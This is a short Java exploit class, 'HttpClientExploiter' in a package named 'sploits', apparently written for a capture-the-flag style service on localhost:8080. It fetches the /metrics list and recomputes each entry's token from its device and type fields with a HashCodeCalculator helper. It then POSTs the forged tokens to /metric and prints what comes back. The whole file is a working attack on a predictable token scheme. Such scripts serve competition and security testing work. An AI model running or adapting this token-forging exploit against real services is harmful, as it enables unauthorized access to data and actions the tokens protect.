package sploits;

import org.json.JSONObject;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.Map;

public class HttpClientExploiter {

    private static final String URL_GET = "http://localhost:8080/metrics";
    private static final String URL_POST = URL_GET + "/metric";

    public static void main(String[] args) {
        var httpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).build();
        try {
            exploit(httpClient);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    private static void exploit(HttpClient httpClient) throws IOException, InterruptedException {
        HttpRequest getRequest = HttpRequest.newBuilder()
                .uri(URI.create(URL_GET))
                .GET()
                .build();

        var response = httpClient.send(getRequest, HttpResponse.BodyHandlers.ofString());
        var jsonObject = new JSONObject(response.body());
        var metrics = jsonObject.getJSONArray("metrics");
        for (int i = 0; i < metrics.length(); i++) {
            var metric = metrics.getJSONObject(i);
            var device = metric.getString("device");
            var type = metric.getString("type");
            var token = HashCodeCalculator.calculateHash(device, type);
            var postRequest = HttpRequest.newBuilder()
                    .uri(URI.create(URL_POST))
                    .POST(HttpRequest.BodyPublishers.ofString(new JSONObject(Map.of("token", token)).toString()))
                    .build();
            System.out.println(httpClient.send(postRequest, HttpResponse.BodyHandlers.ofString()).body());
        }
    }


}
